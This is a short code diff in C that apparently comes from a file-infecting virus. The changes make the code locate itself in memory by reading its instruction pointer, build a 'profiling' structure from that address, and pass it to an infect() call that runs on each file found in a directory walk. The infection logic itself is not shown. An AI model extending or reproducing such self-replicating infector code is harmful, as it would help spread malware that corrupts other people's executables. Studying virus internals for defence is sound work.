@@ -15,6 +15,9 @@
 #define BUFF_SIZE 0x1000
 
 void _start() {
+	byte		*start_rip;
+	get_rip(start_rip);
+
 	int64_t		ret = 0;
 	uint64_t	fd;
 	byte		buff[BUFF_SIZE];
@@ -23,6 +26,11 @@ void _start() {
 	char		max_path[513];
 	dirent		*d;
 	uint64_t	string = 0x000a333333333333;
+	profiling	this;
+	
+	start_rip -= 0x12;
+	this = get_profiling(start_rip);
+	(void)this;
 
 	write(ret, 1, &string, sizeof(uint64_t));
 
@@ -59,7 +67,7 @@ void _start() {
 					for (size_t i = 0; i < file_size; i++)
 						max_path[len_dir + 1 + i] = d->d_name[i];
 
-					infect(max_path);
+					infect(&this, max_path);
 				}
 
 				d_offset += d->d_reclen;
